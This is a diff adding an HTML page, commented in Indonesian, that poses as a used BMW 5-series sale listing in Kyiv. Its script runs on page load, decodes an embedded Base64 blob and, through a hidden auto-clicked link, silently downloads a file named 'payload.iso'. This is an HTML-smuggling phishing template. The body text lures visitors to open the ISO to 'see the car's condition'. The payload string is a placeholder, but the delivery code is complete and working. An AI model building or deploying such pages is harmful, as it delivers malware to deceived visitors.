@@ -1,0 +1,53 @@
+<html>
+<body>
+<script>
+  // Fungsi untuk mengonversi string Base64 menjadi ArrayBuffer
+  function base64ToArrayBuffer(base64) {
+    // Dekode string Base64 menjadi string biner
+    var binary_string = window.atob(base64);
+    var len = binary_string.length;  // Mendapatkan panjang string biner
+    var bytes = new Uint8Array(len);  // Membuat array Uint8Array untuk menampung data biner
+    for (var i = 0; i < len; i++) {
+      // Menyimpan setiap karakter biner ke dalam array bytes
+      bytes[i] = binary_string.charCodeAt(i);
+    }
+    return bytes.buffer;  // Mengembalikan buffer array hasil konversi
+  }
+
+  // Menyimpan string Base64 dari file (gantikan dengan string Base64 Anda)
+  var file = 'Your base64 string here';
+  // Memanggil fungsi konversi untuk mengubah Base64 menjadi ArrayBuffer
+  var data = base64ToArrayBuffer(file);
+  // Membuat objek Blob dari data ArrayBuffer dengan tipe "octet/stream"
+  var blob = new Blob([data], {type: 'octet/stream'});
+  // Menentukan nama file yang akan diunduh
+  var fileName = 'payload.iso';
+  // Membuat elemen <a> untuk mengunduh file
+  var a = document.createElement('a');
+  // Menambahkan elemen <a> ke dalam dokumen
+  document.body.appendChild(a);
+  // Menyembunyikan elemen <a> agar tidak terlihat di halaman
+  a.style = 'display: none;';
+  // Membuat URL sementara untuk file Blob
+  var url = window.URL.createObjectURL(blob);
+  // Menetapkan URL dan nama file yang akan diunduh
+  a.href = url;
+  a.download = fileName;
+  // Menjalankan klik otomatis pada elemen <a> untuk memulai unduhan
+  a.click();
+  // Menghapus URL sementara setelah unduhan selesai
+  window.URL.revokeObjectURL(url);
+</script>
+
+<div class="container">
+    <h1>BMW for Sale</h1>
+    <hr>
+    <!-- Menampilkan gambar logo BMW dengan sumber gambar dari file lokal "car.png" -->
+    <img class="bmw-logo" src="car.png" alt="BMW logo">
+    <hr>
+    <!-- Menampilkan deskripsi penjualan mobil BMW -->
+    <p> Penjualan BMW 5-series sedan bekas yang terletak di Kyiv.</p>
+    <p>Anda dapat melihat detail dan kondisi mobil melalui gambar dan file iso.</p>
+</div>
+</body>
+</html>
